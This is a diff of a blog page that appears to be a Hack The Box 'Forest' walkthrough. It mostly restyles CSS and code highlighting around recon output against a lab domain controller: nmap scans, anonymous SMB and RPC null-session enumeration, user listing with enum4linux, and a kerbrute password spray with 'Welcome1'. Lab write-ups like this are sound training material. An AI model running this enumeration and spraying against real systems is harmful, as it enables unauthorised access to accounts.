@@ -59,6 +59,7 @@
       --code-background-color: #f2f2f2;
       --code-color: #222;
       --blockquote-color: #222;
+      --overflow-wrap: break-word;
   }
 
   @media (prefers-color-scheme: dark) {
@@ -148,7 +149,7 @@
       color: var(--code-color);
       white-space: pre-wrap;
       word-wrap: break-word;
-      overflow-wrap: break-word;
+      overflow-wrap: anywhere;
   }
 
   blockquote {
@@ -180,9 +181,10 @@
       background-color: var(--code-background-color);
       color: var(--code-color);
       padding: 5px 10px;
-      white-space: pre-wrap;
-      word-wrap: break-word; 
-      overflow-wrap: break-word;
+      word-break: normal;
+      white-space: pre-wrap; 
+      overflow-wrap: anywhere;
+      overflow-x: auto;
   }
 
    
@@ -201,38 +203,6 @@
 
   ul.blog-posts li a:visited {
       color: var(--visited-color);
-  }
-  .terminal-container {
-    background-color: #C0C0C0;  
-    border: 2px solid #808080;  
-    border-radius: 4px;  
-    padding: 10px;  
-    box-shadow: 3px 3px 8px rgba(0, 0, 0, 0.5);  
-    position: relative;  
-    margin: 20px auto;  
-    width: fit-content;  
-    max-width: 100%;  
-  }
-  .terminal-title-bar {
-    background-color: #000080;  
-    color: #FFFFFF;  
-    font-family: "Arial", sans-serif;  
-    font-size: 14px;  
-    padding: 5px 10px;  
-    border-bottom: 2px solid #808080;  
-    border-radius: 4px 4px 0 0;  
-    text-align: left;  
-  }
-  .terminal-codebox {
-    background-color: #000000;  
-    color: #00FF00;  
-    font-family: "Courier New", monospace;  
-    padding: 10px;  
-    overflow-x: auto;  
-    white-space: pre;  
-    border-radius: 3px;  
-    border: 1px solid #808080;  
-  }
 </style>
 
 </head>
@@ -264,11 +234,11 @@
 <hr>
 <p>As always, we start off with an nmap scan for the IP we are given to see what ports are open. First, we will start with a quick scan to get a lay of the land. Then, we will follow up with a comprehensive scan on all ports to get more information.</p>
 <p>Quick scan results:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$cat forest_top1k.nmap 
-</span></span><span style="display:flex;"><span><span style="color:#75715e"># Nmap 7.94SVN scan initiated Tue Jan 21 14:38:57 2025 as: nmap --open -oA Scans/forest_top1k 10.10.10.161</span>
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.161
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.028s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">989</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$cat forest_top1k.nmap 
+</span></span><span style="display:flex;"><span># Nmap 7.94SVN scan initiated Tue Jan <span style="color:#ae81ff">21</span> 14:38:57 <span style="color:#ae81ff">2025</span> as: nmap --open -oA Scans/forest_top1k 10.10.10.161
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.161
+</span></span><span style="display:flex;"><span>Host is up (0.028s latency).
+</span></span><span style="display:flex;"><span>Not shown: 989 closed tcp ports (reset)
 </span></span><span style="display:flex;"><span>PORT     STATE SERVICE
 </span></span><span style="display:flex;"><span>53/tcp   open  domain
 </span></span><span style="display:flex;"><span>88/tcp   open  kerberos-sec
@@ -282,28 +252,28 @@
 </span></span><span style="display:flex;"><span>3268/tcp open  globalcatLDAP
 </span></span><span style="display:flex;"><span>3269/tcp open  globalcatLDAPssl
 </span></span></code></pre></div><p>Comprehensive scan results:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$sudo nmap -p- -A 10.10.10.161 -oA forest_all                                                                                                                                                                                      
-</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-01-23 13:39 EST                                                                                   
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.161                                                                                                                    
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.025s latency<span style="color:#f92672">)</span>.                                                                                                                         
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65511</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>                                                                                                            
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$sudo nmap -p- -A 10.10.10.161 -oA forest_all                                                                                                                                                                                      
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-23 13:39 EST                                                                                   
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.10.161                                                                                                                    
+</span></span><span style="display:flex;"><span>Host is up (0.025s latency).                                                                                                                         
+</span></span><span style="display:flex;"><span>Not shown: 65511 closed tcp ports (reset)                                                                                                            
 </span></span><span style="display:flex;"><span>PORT      STATE SERVICE      VERSION                                                                                                                 
 </span></span><span style="display:flex;"><span>53/tcp    open  domain       Simple DNS Plus                                                                                                         
-</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2025-01-23 18:47:23Z<span style="color:#f92672">)</span>                                                          
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-23 18:47:23Z)                                                          
 </span></span><span style="display:flex;"><span>135/tcp   open  msrpc        Microsoft Windows RPC                                                                                                   
 </span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn                                                                                           
-</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>                              
-</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> microsoft-ds <span style="color:#f92672">(</span>workgroup: HTB<span style="color:#f92672">)</span>                                                        
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                              
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)                                                        
 </span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
 </span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0                                                                                     
 </span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped                                                
-</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span style="color:#f92672">(</span>Domain: htb.local, Site: Default-First-Site-Name<span style="color:#f92672">)</span>                              
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                              
 </span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped  
-</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>                                                                                 
+</span></span><span style="display:flex;"><span>5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                 
 </span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0                               
 </span></span><span style="display:flex;"><span>|_http-title: Not Found                                                   
 </span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf       .NET Message Framing
-</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>      
+</span></span><span style="display:flex;"><span>47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)      
 </span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0                               
 </span></span><span style="display:flex;"><span>|_http-title: Not Found                                                   
 </span></span><span style="display:flex;"><span>49664/tcp open  msrpc        Microsoft Windows RPC                        
@@ -316,29 +286,29 @@
 </span></span><span style="display:flex;"><span>49684/tcp open  msrpc        Microsoft Windows RPC                        
 </span></span><span style="display:flex;"><span>49703/tcp open  msrpc        Microsoft Windows RPC                        
 </span></span><span style="display:flex;"><span>49899/tcp open  msrpc        Microsoft Windows RPC                        
-</span></span><span style="display:flex;"><span>No exact OS matches <span style="color:#66d9ef">for</span> host <span style="color:#f92672">(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
 </span></span><span style="display:flex;"><span>TCP/IP fingerprint:                                                                                                                                  
-</span></span><span style="display:flex;"><span>OS:SCAN<span style="color:#f92672">(</span>V<span style="color:#f92672">=</span>7.94SVN%E<span style="color:#f92672">=</span>4%D<span style="color:#f92672">=</span>1/23%OT<span style="color:#f92672">=</span>53%CT<span style="color:#f92672">=</span>1%CU<span style="color:#f92672">=</span>42166%PV<span style="color:#f92672">=</span>Y%DS<span style="color:#f92672">=</span>2%DC<span style="color:#f92672">=</span>T%G<span style="color:#f92672">=</span>Y%TM<span style="color:#f92672">=</span><span style="color:#ae81ff">6792</span>                                                                          
-</span></span><span style="display:flex;"><span>OS:8D67%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>104%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>105%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>                                                                          
-</span></span><span style="display:flex;"><span>OS:1%ISR<span style="color:#f92672">=</span>105%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>105%CI<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>                                                                          
-</span></span><span style="display:flex;"><span>OS:06%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>SEQ<span style="color:#f92672">(</span>SP<span style="color:#f92672">=</span>105%GCD<span style="color:#f92672">=</span>1%ISR<span style="color:#f92672">=</span>106%II<span style="color:#f92672">=</span>I%TS<span style="color:#f92672">=</span>A<span style="color:#f92672">)</span>OPS<span style="color:#f92672">(</span>O1<span style="color:#f92672">=</span>M53CNW8ST11%O2<span style="color:#f92672">=</span>M53CNW8                                                                          
-</span></span><span style="display:flex;"><span>OS:ST11%O3<span style="color:#f92672">=</span>M53CNW8NNT11%O4<span style="color:#f92672">=</span>M53CNW8ST11%O5<span style="color:#f92672">=</span>M53CNW8ST11%O6<span style="color:#f92672">=</span>M53CST11<span style="color:#f92672">)</span>WIN<span style="color:#f92672">(</span>W1<span style="color:#f92672">=</span><span style="color:#ae81ff">20</span>                                                                          
-</span></span><span style="display:flex;"><span>OS:00%W2<span style="color:#f92672">=</span>2000%W3<span style="color:#f92672">=</span>2000%W4<span style="color:#f92672">=</span>2000%W5<span style="color:#f92672">=</span>2000%W6<span style="color:#f92672">=</span>2000<span style="color:#f92672">)</span>ECN<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>2000%O<span style="color:#f92672">=</span>M5                                                                          
-</span></span><span style="display:flex;"><span>OS:3CNW8NNS%CC<span style="color:#f92672">=</span>Y%Q<span style="color:#f92672">=)</span>T1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%S<span style="color:#f92672">=</span>O%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AS%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T2<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span><span style="color:#ae81ff">80</span>                                                                          
-</span></span><span style="display:flex;"><span>OS:%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T3<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q                                                                          
-</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=)</span>T4<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T5<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A                                                                          
-</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T6<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>A%A<span style="color:#f92672">=</span>O%F<span style="color:#f92672">=</span>R%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>T7<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%D                                                                          
-</span></span><span style="display:flex;"><span>OS:F<span style="color:#f92672">=</span>Y%T<span style="color:#f92672">=</span>80%W<span style="color:#f92672">=</span>0%S<span style="color:#f92672">=</span>Z%A<span style="color:#f92672">=</span>S+%F<span style="color:#f92672">=</span>AR%O<span style="color:#f92672">=</span>%RD<span style="color:#f92672">=</span>0%Q<span style="color:#f92672">=)</span>U1<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DF<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%IPL<span style="color:#f92672">=</span>164%UN<span style="color:#f92672">=</span>0%RIPL                                                                          
-</span></span><span style="display:flex;"><span>OS:<span style="color:#f92672">=</span>G%RID<span style="color:#f92672">=</span>G%RIPCK<span style="color:#f92672">=</span>G%RUCK<span style="color:#f92672">=</span>G%RUD<span style="color:#f92672">=</span>G<span style="color:#f92672">)</span>IE<span style="color:#f92672">(</span>R<span style="color:#f92672">=</span>Y%DFI<span style="color:#f92672">=</span>N%T<span style="color:#f92672">=</span>80%CD<span style="color:#f92672">=</span>Z<span style="color:#f92672">)</span>                                                                                             
+</span></span><span style="display:flex;"><span>OS:SCAN(V=7.94SVN%E=4%D=1/23%OT=53%CT=1%CU=42166%PV=Y%DS=2%DC=T%G=Y%TM=6792                                                                          
+</span></span><span style="display:flex;"><span>OS:8D67%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=105%TS=A)SEQ(SP=105%GCD=                                                                          
+</span></span><span style="display:flex;"><span>OS:1%ISR=105%TS=A)SEQ(SP=105%GCD=1%ISR=105%CI=I%TS=A)SEQ(SP=105%GCD=1%ISR=1                                                                          
+</span></span><span style="display:flex;"><span>OS:06%TS=A)SEQ(SP=105%GCD=1%ISR=106%II=I%TS=A)OPS(O1=M53CNW8ST11%O2=M53CNW8                                                                          
+</span></span><span style="display:flex;"><span>OS:ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=20                                                                          
+</span></span><span style="display:flex;"><span>OS:00%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M5                                                                          
+</span></span><span style="display:flex;"><span>OS:3CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80                                                                          
+</span></span><span style="display:flex;"><span>OS:%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q                                                                          
+</span></span><span style="display:flex;"><span>OS:=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A                                                                          
+</span></span><span style="display:flex;"><span>OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%D                                                                          
+</span></span><span style="display:flex;"><span>OS:F=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL                                                                          
+</span></span><span style="display:flex;"><span>OS:=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)                                                                                             
 </span></span><span style="display:flex;"><span>                                                                                                                                                     
-</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops 
+</span></span><span style="display:flex;"><span>Network Distance: 2 hops 
 </span></span><span style="display:flex;"><span>Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows                                                                               
 </span></span><span style="display:flex;"><span>                                                                          
 </span></span><span style="display:flex;"><span>Host script results:                                                                                                                                 
 </span></span><span style="display:flex;"><span>| smb-os-discovery:         
-</span></span><span style="display:flex;"><span>|   OS: Windows Server <span style="color:#ae81ff">2016</span> Standard <span style="color:#ae81ff">14393</span> <span style="color:#f92672">(</span>Windows Server <span style="color:#ae81ff">2016</span> Standard 6.3<span style="color:#f92672">)</span>                                                                        
+</span></span><span style="display:flex;"><span>|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)                                                                        
 </span></span><span style="display:flex;"><span>|   Computer name: FOREST                                                 
-</span></span><span style="display:flex;"><span>|   NetBIOS computer name: FOREST<span style="color:#ae81ff">\x</span><span style="color:#ae81ff">00</span>                                     
+</span></span><span style="display:flex;"><span>|   NetBIOS computer name: FOREST\x00                                     
 </span></span><span style="display:flex;"><span>|   Domain name: htb.local                                                
 </span></span><span style="display:flex;"><span>|   Forest name: htb.local                                                
 </span></span><span style="display:flex;"><span>|   FQDN: FOREST.htb.local                                                
@@ -355,11 +325,11 @@
 </span></span><span style="display:flex;"><span>|   authentication_level: user                                            
 </span></span><span style="display:flex;"><span>|   challenge_response: supported                                                                                                                    
 </span></span><span style="display:flex;"><span>|_  message_signing: required
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 80/tcp<span style="color:#f92672">)</span>                                            
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>TRACEROUTE (using port 80/tcp)                                            
 </span></span><span style="display:flex;"><span>HOP RTT      ADDRESS                                                      
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   23.77 ms 10.10.14.1                                                   
-</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   24.08 ms 10.10.10.161             
+</span></span><span style="display:flex;"><span>1   23.77 ms 10.10.14.1                                                   
+</span></span><span style="display:flex;"><span>2   24.08 ms 10.10.10.161             
 </span></span></code></pre></div><p>This looks like a DC for the htb.local domain. There are a few interesting ports, namely LDAP and SMB. The first things I think of when I see these open are:</p>
 <ol>
 <li>SMB anonymous access to list shares</li>
@@ -367,41 +337,41 @@
 <li>LDAP anonymous binds</li>
 </ol>
 <p>Investigating SMB. Trying anonymous login:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$smbclient -N -L //10.10.10.161
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$smbclient -N -L //10.10.10.161
 </span></span><span style="display:flex;"><span>Anonymous login successful
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
 </span></span><span style="display:flex;"><span>        ---------       ----      -------
-</span></span><span style="display:flex;"><span>Reconnecting with SMB1 <span style="color:#66d9ef">for</span> workgroup listing.
-</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.10.161 failed <span style="color:#f92672">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 for workgroup listing.
+</span></span><span style="display:flex;"><span>do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 </span></span><span style="display:flex;"><span>Unable to connect with SMB1 -- no workgroup available
 </span></span></code></pre></div><p>No luck. Let&rsquo;s check RPC and see if we can find any information. It looks like we are able to get the domain password policy.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$rpcclient -U <span style="color:#e6db74">&#34;%&#34;</span> 10.10.10.161
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$rpcclient -U <span style="color:#e6db74">&#34;%&#34;</span> 10.10.10.161
 </span></span><span style="display:flex;"><span>rpcclient $&gt; querydominfo
 </span></span><span style="display:flex;"><span>Domain:         HTB
 </span></span><span style="display:flex;"><span>Server:
 </span></span><span style="display:flex;"><span>Comment:
-</span></span><span style="display:flex;"><span>Total Users:    <span style="color:#ae81ff">105</span>
-</span></span><span style="display:flex;"><span>Total Groups:   <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>Total Aliases:  <span style="color:#ae81ff">0</span>
-</span></span><span style="display:flex;"><span>Sequence No:    <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>Total Users:    105
+</span></span><span style="display:flex;"><span>Total Groups:   0
+</span></span><span style="display:flex;"><span>Total Aliases:  0
+</span></span><span style="display:flex;"><span>Sequence No:    1
 </span></span><span style="display:flex;"><span>Force Logoff:   -1
 </span></span><span style="display:flex;"><span>Domain Server State:    0x1
 </span></span><span style="display:flex;"><span>Server Role:    ROLE_DOMAIN_PDC
 </span></span><span style="display:flex;"><span>Unknown 3:      0x1
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>rpcclient $&gt; getdompwinfo
-</span></span><span style="display:flex;"><span>min_password_length: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>rpcclient $&gt; getdompwinfo
+</span></span><span style="display:flex;"><span>min_password_length: 7
 </span></span><span style="display:flex;"><span>password_properties: 0x00000000
 </span></span></code></pre></div><p>We can also use tools like enum4linux-ng.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> <span style="color:#f92672">=========================================</span>
-</span></span><span style="display:flex;"><span>|    Policies via RPC <span style="color:#66d9ef">for</span> 10.10.10.161    |
-</span></span><span style="display:flex;"><span> <span style="color:#f92672">=========================================</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying port 445/tcp
-</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found policy:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> =========================================
+</span></span><span style="display:flex;"><span>|    Policies via RPC for 10.10.10.161    |
+</span></span><span style="display:flex;"><span> =========================================
+</span></span><span style="display:flex;"><span>[*] Trying port 445/tcp
+</span></span><span style="display:flex;"><span>[+] Found policy:
 </span></span><span style="display:flex;"><span>Domain password information:
-</span></span><span style="display:flex;"><span>  Password history length: <span style="color:#ae81ff">24</span>
-</span></span><span style="display:flex;"><span>  Minimum password length: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>  Password history length: 24
+</span></span><span style="display:flex;"><span>  Minimum password length: 7
 </span></span><span style="display:flex;"><span>  Maximum password age: not set
 </span></span><span style="display:flex;"><span>  Password properties:
 </span></span><span style="display:flex;"><span>  - DOMAIN_PASSWORD_COMPLEX: false
@@ -411,8 +381,8 @@
 </span></span><span style="display:flex;"><span>  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
 </span></span><span style="display:flex;"><span>  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
 </span></span><span style="display:flex;"><span>Domain lockout information:
-</span></span><span style="display:flex;"><span>  Lockout observation window: <span style="color:#ae81ff">30</span> minutes
-</span></span><span style="display:flex;"><span>  Lockout duration: <span style="color:#ae81ff">30</span> minutes
+</span></span><span style="display:flex;"><span>  Lockout observation window: 30 minutes
+</span></span><span style="display:flex;"><span>  Lockout duration: 30 minutes
 </span></span><span style="display:flex;"><span>  Lockout threshold: None
 </span></span><span style="display:flex;"><span>Domain logoff information:
 </span></span><span style="display:flex;"><span>  Force logoff time: not set
@@ -424,7 +394,7 @@
 <li>Passwords never expire</li>
 </ol>
 <p>All of these make this a candidate for a password spray. We can get a list of users again using enum4linux-ng:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$enum4linux -U 10.10.10.161 | grep <span style="color:#e6db74">&#34;user:&#34;</span> | cut -f2 -d<span style="color:#e6db74">&#34;[&#34;</span> | cut -f1 -d<span style="color:#e6db74">&#34;]&#34;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$enum4linux -U 10.10.10.161 | grep <span style="color:#e6db74">&#34;user:&#34;</span> | cut -f2 -d<span style="color:#e6db74">&#34;[&#34;</span> | cut -f1 -d<span style="color:#e6db74">&#34;]&#34;</span>
 </span></span><span style="display:flex;"><span>Administrator
 </span></span><span style="display:flex;"><span>Guest
 </span></span><span style="display:flex;"><span>krbtgt
@@ -457,72 +427,72 @@
 </span></span><span style="display:flex;"><span>mark
 </span></span><span style="display:flex;"><span>santi
 </span></span></code></pre></div><p>We attempt a password spray with the password &ldquo;Welcome1&rdquo;, but don&rsquo;t find any valid credentials. Since this environment is so favorable for spraying, we could try more passwords, but I think this may not be the way in.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$./kerbrute_linux_amd64 passwordspray -d htb.local --dc 10.10.10.161 CPTS_Prep/Forest/users.txt Welcome1
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    __             __               __     
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$./kerbrute_linux_amd64 passwordspray -d htb.local --dc 10.10.10.161 CPTS_Prep/Forest/users.txt Welcome1
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>    __             __               __     
 </span></span><span style="display:flex;"><span>   / /_____  _____/ /_  _______  __/ /____ 
